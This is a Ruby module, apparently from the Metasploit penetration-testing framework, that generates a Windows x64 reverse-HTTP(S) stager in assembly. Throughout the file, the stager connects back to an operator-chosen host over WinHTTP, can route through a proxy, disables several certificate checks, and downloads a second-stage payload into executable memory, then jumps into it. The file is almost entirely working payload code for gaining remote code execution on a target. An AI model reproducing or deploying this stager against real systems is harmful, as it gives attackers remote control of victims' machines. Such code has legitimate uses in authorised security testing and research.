# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/reverse_winhttp'
require 'rex/payloads/meterpreter/config'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S) using WinHTTP
#
###

module Payload::Windows::ReverseWinHttp_x64

  include Msf::Payload::Windows::ReverseHttp_x64

  #
  # Generate the first stage
  #
  def generate(opts={})
    conf = {
      ssl:         opts[:ssl] || false,
      host:        datastore['LHOST'],
      port:        datastore['LPORT'],
      url:         generate_small_uri,
      retry_count: datastore['StagerRetryCount']
    }

    # Add extra options if we have enough space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:url]              = generate_uri
      conf[:exitfunk]         = datastore['EXITFUNC']
      conf[:verify_cert_hash] = opts[:verify_cert_hash]
      conf[:proxy_host]       = datastore['PayloadProxyHost']
      conf[:proxy_port]       = datastore['PayloadProxyPort']
      conf[:proxy_user]       = datastore['PayloadProxyUser']
      conf[:proxy_pass]       = datastore['PayloadProxyPass']
      conf[:proxy_type]       = datastore['PayloadProxyType']
      conf[:retry_count]      = datastore['StagerRetryCount']
    end

    generate_reverse_winhttp(conf)
  end

  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttp(opts={})
    combined_asm = %Q^
      cld                             ; Clear the direction flag.
      and rsp, 0xFFFFFFFFFFFFFFF0     ; Ensure RSP is 16 byte aligned 
      call start                      ; Call start, this pushes the address of 'api_call'
                                      ; onto the stack.
      #{asm_block_api}
      start:
        pop rbp
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # The final estimated size
    space
  end

  #
  # Convert a string into a NULL-terminated wchar byte array
  #
  def asm_generate_wchar_array(str)
    (str.to_s + "\x00").
      unpack("C*").
      pack("v*").
      unpack("C*").
      map{ |c| "0x%.2x" % c }.
      join(",")
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :ssl Whether or not to enable SSL
  # @option opts [String] :url The URI to request during staging
  # @option opts [String] :host The host to connect to
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :verify_cert_hash A 20-byte raw SHA-1 hash of the certificate to verify, or nil
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
  #
  def asm_reverse_winhttp(opts={})

    retry_count       = [opts[:retry_count].to_i, 1].max
    verify_ssl        = nil
    encoded_cert_hash = nil
    encoded_url       = asm_generate_wchar_array(opts[:url])
    encoded_host      = asm_generate_wchar_array(opts[:host])

    if opts[:ssl] && opts[:verify_cert_hash]
      verify_ssl = true
      encoded_cert_hash = opts[:verify_cert_hash].unpack("C*").map{|c| "0x%.2x" % c }.join(",")
    end

    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
    proxy_info    = ""

    if proxy_enabled
      if opts[:proxy_type].to_s.downcase == "socks"
        proxy_info << "socks="
      else
        proxy_info << "http://"
      end

      proxy_info << opts[:proxy_host].to_s
      if opts[:proxy_port].to_i > 0
        proxy_info << ":#{opts[:proxy_port]}"
      end

      proxy_info = asm_generate_wchar_array(proxy_info)
    end

    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_user])
    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_pass])

    http_open_flags = 0x00000100 # WINHTTP_FLAG_BYPASS_PROXY_CACHE
    secure_flags = (
      0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
      0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
      0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
      0x00000100 ) # SECURITY_FLAG_IGNORE_UNKNOWN_CA

    if opts[:ssl]
      http_open_flags |= 0x00800000 # WINHTTP_FLAG_SECURE
    end

    asm = %Q^
      ; Input: RBP must be the address of 'api_call'.
      ; Clobbers: RAX, RSI, RDI, RSP will also be modified

        xor rbx, rbx

      load_winhttp:
        push rbx
        mov r14, 'winhttp'            ; prepare the string 'winhttp'
        push r14
        mov rcx, rsp                  ; point to the string
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call rbp                      ; Call LoadLibraryA("winhttp")
      ^

    if verify_ssl
      asm << %Q^
      load_crypt32:
        push rbx
        mov r14, 'crypt32'            ; prepare the string 'crypt32'
        push r14
        mov rcx, rsp                  ; point to the string
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call rbp                      ; Call LoadLibraryA("crypt32")
      ^
    end

    asm << %Q^
      WinHttpOpen:
    ^

    if proxy_enabled
      asm << %Q^
      call get_proxy_server
        db #{proxy_info}
      get_proxy_server:
        pop r8                        ; stack pointer (lpszProxyName)
        push 3                        ; WINHTTP_ACCESS_TYPE_NAMED_PROXY 3 (dwAccessType)
        pop rdx
      ^
    else
      asm << %Q^
        xor r8, r8                    ; NULL (lpszProxyName)
        ; the push/pop sequence saves a byte over XOR
        push rbx                      ; push 0
        pop rdx                       ; WINHTTP_ACCESS_TYPE_DEFAULT_PROXY 0 (dwAccesType)
      ^
    end

    asm << %Q^
        xor r9, r9                    ; NULL (lpszProxyBypass)
        push rbx                      ; 0 for alignment
        mov rcx, rsp                  ; Pointer to empty string ("")
        push rbx                      ; NULL (lpszProxyBypass)
        push rbx                      ; 0 (dwFlags)
        push rbx                      ; 0 for alignment
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
        call rbp                      ; Call WinHttpOpen(...)

      WinHttpConnect:
        call get_server_host
        db #{encoded_host}
      get_server_host:
        pop rdx                       ; Stack pointer (pswzServerName)
        mov rcx, rax                  ; hSession
        mov r8, #{opts[:port]}        ; nServerPort
        ; r9 should still be 0 after the previous call, so we don't need
        ; to clear it again
        xor r9, r9                    ; 0 (dwReserved)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')}
        call rbp

      WinHttpOpenRequest:
        call get_server_uri
        db #{encoded_url}
      get_server_uri:
        pop r8                        ; Stack pointer (pwszObjectName)
        xor r9, r9                    ; NULL (pwszVersion)
        push rbx                      ; 0 for alignment
        ; the push/pop sequence saves a byte over XOR
        push rbx                      ; push 0
        pop rdx                       ; NULL (pwszVerb - defaults to GET)
        mov rcx, rax                  ; returned by WinHttpConnect (hConnect)
        push 0x#{http_open_flags.to_s(16)} ; (dwFlags)
        push rbx                      ; NULL (ppwszAcceptTypes)
        push rbx                      ; NULL (pwszReferer)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')}
        call rbp
        xchg rsi, rax                 ; save HttpRequest handle in rsi
      ^

    if proxy_enabled && proxy_user
      asm << %Q^
      set_up_proxy_config:
        push rbx               ; pAuthParams (NULL)
      ^

      if proxy_pass
        asm << %Q^
        call got_proxy_pass    ; put proxy_pass on the stack
      proxy_pass:
        db #{proxy_pass}
      got_proxy_pass:
                               ; pwszPassword now on the stack
        ^
      else
        asm << %Q^
        push rbx               ; pwszPassword (NULL)
        ^
      end

      asm << %Q^
        call got_proxy_user           ; put proxy user on the stack
      proxy_user:
        db #{proxy_user}
      got_proxy_user:
        pop r9                        ; Get proxy user (pwszUserName)
        ; the push/pop sequence saves a byte over XOR
        push rbx                      ; push 0
        pop rdx                       ; rdx is now 0
        inc edx                       ; WINHTTP_AUTH_TARGET_PROXY = 1 (dwAuthSceme)
        mov r8, rdx                   ; WINHTTP_AUTH_SCHEME_BASIC = 1 (dwAuthTargets)
        mov rcx, rsi                  ; Request handle (hRequest)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetCredentials')}
        call rbp
      ^
    end

    if opts[:ssl]
      asm << %Q^
      set_security_options:
        mov rcx, rsi                  ; Handle for request (hConnect)
        push 31
        pop rdx                       ; WINHTTP_OPTION_SECURITY_FLAGS (dwOption)
        push 0x#{secure_flags.to_s(16)}
        mov r8, rsp                   ; Pointer to flags (lpBuffer)
        push 4
        pop r9                        ; 4 (dwBufferLength)
        push rbx                      ; 0 for alignment
        push rbx                      ; 0 for alignment
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
        call rbp
        test eax, eax                 ; use eax, it's 1 byte less than rax
        jz failure
        ; more alignment require as a result of this call. I have no idea why.
        push rbx                      ; 0 for alignment
        push rbx                      ; 0 for alignment
      ^
    end

    asm << %Q^
      ; Store our retry counter in the rdi register
      set_retry:
        push #{retry_count}
        pop rdi

      send_request:

      WinHttpSendRequest:
        mov rcx, rsi                  ; Request handle (hRequest)
        ; the push/pop sequence saves a byte over XOR
        push rbx                      ; push 0
        pop rdx                       ; NULL (pwszHeaders)
        xor r8, r8                    ; 0 (dwHeadersLength)
        xor r9, r9                    ; NULL (lpOptional)
        push rbx                      ; push 0 (dwContext)
        push rbx                      ; push 0 (dwTotalLength)
        push rbx                      ; push 0 (dwOptionalLength)
    ^

    # required extra alignment for non-ssl payloads. Still don't know why.
    unless opts[:ssl]
      asm << %Q^
        push rbx                      ; 0 for alignment
      ^
    end

    asm << %Q^
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
        call rbp
        test eax, eax                 ; use eax, it's 1 byte less than rax
        jnz check_response            ; if TRUE call WinHttpReceiveResponse API

      try_it_again:
        dec edi                       ; use edi, it's 1 byte less than rdi
        jnz send_request

      ; if we didn't allocate before running out of retries, fall through
    ^

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        push 0x56A2B5F0        ; hardcoded to exitprocess for size
        call rbp
      ^
    end

    # Jump target if the request was sent successfully
    asm << %Q^
      check_response:
    ^

    # Verify the SSL certificate hash
    if verify_ssl
      asm << %Q^
      ssl_cert_get_context:
        mov rcx, rsi                  ; Request handle (hInternet)
        push 78                       ; WINHTTP_OPTION_SERVER_CERT_CONTEXT
        pop rdx                       ; (dwOption)
        ; Thanks to things that are on the stack from previous calls, we don't need to
        ; worry about adding something to the stack to have space for the cert pointer,
        ; so we won't worry about doing it, it'll save us bytes!
        mov r8, rsp                   ; Stack pointer (lpBuffer)
        mov r14, r8                   ; Back the stack pointer up for later use
        push 8                        ; One whole pointer
        mov r9, rsp                   ; Stack pointer (lpdwBufferLength)
        push rbx                      ; 0 for alignment
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
        call rbp
        test eax, eax                 ; use eax instead of rax, saves a byte
        jz failure                    ; Bail out if we couldn't get the certificate context

      ssl_cert_get_server_hash:
        mov rcx, [r14]                ; Cert context pointer (pCertContext)
        push 24                       ; sha1 length, rounded to multiple of 8
        mov r9, rsp                   ; Address of length (pcbData)
        mov r15, rsp                  ; Backup address of length
        sub rsp, [r9]                 ; Allocate 20 bytes for the hash output
        mov r8, rsp                   ; 20 byte buffer (pvData)
        mov r14, r8                   ; Back the stack pointer up for later use
        push 3
        pop rdx                       ; CERT_SHA1_HASH_PROP_ID (dwPropId)
        mov r10, #{Rex::Text.block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
        call rbp
        test eax, eax                 ; use eax instead of rax, saves a byte
        jz failure                    ; Bail out if we couldn't get the certificate context

      ssl_cert_start_verify:
        call ssl_cert_compare_hashes
        db #{encoded_cert_hash}

      ssl_cert_compare_hashes:
        pop rax                       ; get the expected hash
        xchg rax, rsi                 ; swap hash and handle for now
        mov rdi, r14                  ; pointer to the retrieved hash
        mov rcx, [r15]                ; number of bytes to compare
        repe cmpsb                    ; do the hash comparison
        jnz failure                   ; Bail out if the result isn't zero
        xchg rax, rsi                 ; swap hash and handle back!

      ; Our certificate hash was valid, hurray!
      ^
    end

    asm << %Q^
      receive_response:
                                      ; The API WinHttpReceiveResponse needs to be called
                                      ; first to get a valid handle for WinHttpReadData
        mov rcx, rsi                  ; Handle to the request (hRequest)
        ; the push/pop sequence saves a byte over XOR
        push rbx                      ; push 0
        pop rdx                       ; NULL (lpReserved)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
        call rbp
        test eax, eax                 ; use eax instead of rax, saves a byte
        jz failure

      allocate_memory:
        ; the push/pop sequence saves a byte over XOR
        push rbx                      ; push 0
        pop rcx                       ; NULL (lpAddress)
        ; rdx should already be zero, so we can save two bytes by using edx here
        mov edx, 0x00400000           ; 4mb for stage (dwSize)
        mov r8, 0x1000                ; MEM_COMMIT (flAllocationType)
        push 0x40                     ; PAGE_EXECUTE_READWRITE
        pop r9                        ; (flProtect)
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp                      ; Call VirtualAlloc(...);

      download_prep:
        xchg rax, rbx                 ; place the allocated base address in rbx
        push rbx                      ; store a copy of the stage base address on the stack
        push rbx                      ; temporary storage for bytes read count
        mov rdi, rsp                  ; &bytesRead

      download_more:
        mov rcx, rsi                  ; Handle to the request (hFile)
        mov rdx, rbx                  ; Buffer pointer (lpBuffer)
        mov r8, 8192                  ; Size (dwNumberOfBytesToRead)
        mov r9, rdi                   ; Size received (lpNumberOfBytesRead)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
        call rbp
        add rsp, 32                   ; clean up reserved space

        test eax, eax                 ; use eax instead of rax, saves a byte
        jz failure

        mov ax, word ptr [rdi]        ; load the bytes read
        ; Use eax/ebx here, saves a byte. Don't need higher order bytes.
        add ebx, eax                  ; buffer += bytes_received

        test eax, eax                 ; use eax instead of rax, saves a byte
        jnz download_more             ; continue until it returns 0
        pop rax                       ; clear the temporary storage
        pop rax                       ; clear the temporary storage

      execute_stage:
        ret                    ; dive into the stored stage address
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end

